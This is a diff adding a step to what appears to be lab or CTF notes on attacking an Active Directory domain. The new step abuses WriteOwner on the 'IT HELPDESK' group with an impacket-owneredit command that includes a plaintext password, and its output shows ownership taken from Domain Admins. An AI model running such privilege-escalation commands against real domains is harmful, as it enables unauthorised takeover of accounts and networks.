@@ -696,3 +696,17 @@ No extra access on SMB shares
 
 I have WriteOwner on `IT HELPDESK` which means i should be able to assign GenericAll to myself
 
+# Abusing WriteOwner on `IT HELPDESK`
+
+```python
+impacket-owneredit -action write -new-owner 'j.dillon' -target-dn 'CN=IT HELPDESK,CN=USERS,DC=NOVACART,DC=LOCAL' 'novacart.local'/'j.dillon':'novafire2008' -dc-ip 10.0.18.23
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-3314170591-2632404997-3798122088-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=novacart,DC=local
+[*] OwnerSid modified successfully!
+```
+Now ive modified the owner
+
